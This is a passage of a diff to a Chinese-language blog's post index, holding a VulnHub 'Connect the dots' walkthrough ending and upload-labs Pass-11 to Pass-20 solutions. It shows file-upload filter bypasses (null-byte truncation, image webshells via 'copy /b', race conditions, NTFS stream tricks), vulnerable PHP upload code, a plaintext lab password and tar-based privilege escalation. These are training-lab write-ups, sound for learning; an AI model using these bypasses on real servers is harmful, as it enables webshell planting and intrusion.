src="/posts/e4ff8385/1576476969297.png" alt></p><p>ssh开放的端口是7822</p><p>尝试用之前得到的口令去登陆，用户名是<code>morris</code><br>登陆失败</p><p>从80端口的<code>index.html</code>知道，M和N的命名规则，尝试修改用户名为<code>norris</code><br><img src="/posts/e4ff8385/1576477106793.png" alt></p><p>登陆成功！<br>得到<code>user.txt</code>的内容</p><p><img src="/posts/e4ff8385/1576477362762.png" alt><br>之后去<code>/var/www/html</code>目录下查看文件</p><p>发现了<code>.secretfile.swp</code>文件<br>直接查看提示权限不够，于是想到从网页下载</p><p>可以看到<code>.secretfile.swp</code>文件的权限被设置为只有<code>www-data</code>用户才能读写</p><p><img src="/posts/e4ff8385/1576479512154.png" alt></p><p>通过<code>vim -r secretfile.swp</code>得到源文件内容</p><pre><code>I see you&#39;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..blehguessme090</code></pre><p>于是成功登陆morris用户<br><img src="/posts/e4ff8385/1576477489908-1581332150635.png" alt></p><h2 id="最后的“提权”"><a href="#最后的“提权”" class="headerlink" title="最后的“提权”"></a>最后的“提权”</h2><p>登陆了morris用户之后，还是无法进入到root的目录下查看文件</p><p>先上一个<code>LinEnum.sh</code>提权辅助脚本，但是并未发现有意思的东西</p><p>又去找到了另外一个脚本 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p><p>功能比较全面，并且发现了这个：<br><img src="/posts/e4ff8385/1577460701158.png" alt><br>查阅文档发现了这个，类似SUID<br><img src="/posts/e4ff8385/1577460729799.png" alt></p><p>那么尝试用tar去打包root目录下的文件<br><img src="/posts/e4ff8385/1577460784686.png" alt><br>打包失败，原来这个命令应该在<code>norris</code>用户下执行</p><p>于是将root目录下的文件打包<br><img src="/posts/e4ff8385/1576477730035.png" alt></p><p>解压之后得到flag<br><img src="/posts/e4ff8385/1576477748712.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba" target="_blank" rel="noopener">https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba</a><br><a href="https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c" target="_blank" rel="noopener">https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c</a>_</p>]]></content>
       
       
       <categories>
@@ -1401,7 +1581,7 @@
       <link href="/posts/5877398d/"/>
       <url>/posts/5877398d/</url>
       
-        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><pre><code class="php">php &gt; $a = array(1,2,3,4,5);php &gt; current($a);php &gt; echo current($a);1php &gt; echo next($a);2php &gt; echo current($a);2php &gt; echo end($a);5php &gt; echo current($a);5php &gt; echo reset($a);1php &gt; echo current($a);</code></pre><p>于是这样就可以理解了</p><p><img src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><pre><code class="php">$file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];if (!is_array($file)) {    $file = explode(&#39;.&#39;, strtolower($file));}var_dump($file);$ext = end($file);var_dump($ext);$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);if (!in_array($ext, $allow_suffix)) {    $msg = &quot;禁止上传该后缀文件!&quot;;}else{    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;    if (move_uploaded_file($temp_file, $img_path)) {        $msg = &quot;文件上传成功！&quot;;        $is_upload = true;    } else {</code></pre><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可</p><p><img src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><pre><code class="php">    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);</code></pre><p>我们上传一个 <code>shell.php</code><br>内容为：</p><pre><code class="php">&lt;?php file_put_contents(&quot;info.php&quot;, &quot;&lt;?php phpinfo(); ?&gt;&quot;)?&gt;</code></pre><p>之后去访问这个文件，就能生成 info.php</p><p><img src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src="/posts/5877398d/1580564202994.png" alt></p>]]></content>
+        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><pre><code class="php">php &gt; $a = array(1,2,3,4,5);php &gt; current($a);php &gt; echo current($a);1php &gt; echo next($a);2php &gt; echo current($a);2php &gt; echo end($a);5php &gt; echo current($a);5php &gt; echo reset($a);1php &gt; echo current($a);</code></pre><p>于是这样就可以理解了</p><p><img src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><pre><code class="php">$file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];if (!is_array($file)) {    $file = explode(&#39;.&#39;, strtolower($file));}var_dump($file);$ext = end($file);var_dump($ext);$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);if (!in_array($ext, $allow_suffix)) {    $msg = &quot;禁止上传该后缀文件!&quot;;}else{    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;    if (move_uploaded_file($temp_file, $img_path)) {        $msg = &quot;文件上传成功！&quot;;        $is_upload = true;    } else {</code></pre><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可（<strong>漏洞影响版本：PHP 5.4.38~5.6.6</strong>）</p><blockquote><p>move_uploaded_file ( string $filename , string ​$destination )</p></blockquote><p> 这次的漏洞就出现在参数$destination,这个参数的是将用户上传的文件移动到最终的目的地址。如果$destionation变量是从用户$_GET或者$_POST中获取的并且我们可控，那么我们就可以利用空字符\00来截断后面的拓展名，从而造成任意文件上传</p><p><img src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><pre><code class="php">    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);</code></pre><p>我们上传一个 <code>shell.php</code><br>内容为：</p><pre><code class="php">&lt;?php file_put_contents(&quot;info.php&quot;, &quot;&lt;?php phpinfo(); ?&gt;&quot;)?&gt;</code></pre><p>之后去访问这个文件，就能生成 info.php</p><p><img src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src="/posts/5877398d/1580564202994.png" alt></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>这题原来是有bug的，不过现在修改了</p><p>原来的代码：</p><p><img src="/posts/5877398d/20180829084054-2fdf5136-ab24-1.png" alt></p><p>可以很明显的看到，就算不是gif图片，也能够上传。</p><p><a href="https://xz.aliyun.com/t/2657#toc-0" target="_blank" rel="noopener">参考</a>这篇文章，这题涉及到了二次渲染的绕过问题</p><p>文章中给出的图片：<a href="https://github.com/Yang1k/upload-labs-Pass16" target="_blank" rel="noopener">链接</a></p><p>这样，在上传之后才能够保证二次渲染之后还是有马</p><p><img src="/posts/5877398d/11.gif" alt></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><code>exif_imagetype</code> 检测是否为图片</p><p>制作图片马，然后上传即可</p><pre><code>copy normal.jpg /b + shell.php /a webshell.jpg</code></pre><pre><code class="php">function isImage($filename){    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) {        case IMAGETYPE_GIF:            return &quot;gif&quot;;            break;        case IMAGETYPE_JPEG:            return &quot;jpg&quot;;            break;        case IMAGETYPE_PNG:            return &quot;png&quot;;            break;            default:            return false;            break;    }}</code></pre><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>上传图片马即可</p><pre><code class="php">function isImage($filename){    $types = &#39;.jpeg|.png|.gif&#39;;    if(file_exists($filename)){        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext)&gt;=0){            return $ext;        }else{            return false;        }    }else{        return false;    }}</code></pre><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>判断了文件头，上传图片马即可</p><pre><code class="php">function getReailFileType($filename){    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode){              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        }            return $fileType;}</code></pre><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>利用 <code>CVE-2015-2348</code> ， <code>move_uploaded_file</code> 函数遇到00会截断</p><pre><code class="php">if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传失败&quot;;        }</code></pre><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><code>move_uploaded_file</code> 遇到00会截断</p><pre><code class="php">if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {</code></pre>]]></content>
       
       
       <categories>
